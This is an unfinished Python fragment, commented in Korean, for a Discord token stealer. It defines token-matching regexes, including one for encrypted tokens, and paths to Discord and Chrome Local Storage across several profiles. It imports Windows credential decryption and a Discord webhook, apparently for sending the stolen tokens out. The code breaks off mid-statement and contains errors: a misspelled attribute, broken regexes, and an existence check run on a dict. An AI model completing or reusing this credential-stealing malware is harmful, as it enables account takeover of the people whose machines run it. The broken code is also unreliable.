import base64
import json
import os
import re

import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

def get_token(webhook: str) -> None:
    # 토큰 얻는 코드
    pass

class extract:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata_path = os.getenv("localappdata")

        self.roadming_path = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[w-]{6}\.[w-]{25,110}" # 디스코드 코큰을 찾기 위한 정규식
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.token, self.uid = [], [] # 리스트에 만들어서 저장할 것.
        path = { # 각 프로그램의 경로
            'Discord' : self.roaming_path + '\\discord\\Local Storage\\leveldb',
            'Chrome': self.appdata_path + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        }

        for fname, fpath in path.items():
            if not os.path.exists(path):
                continue
            __DISCORD__ = fname.replace(" ", "").lower()
            if "cord" in fpath:
                if not os.path.exists

class upload():
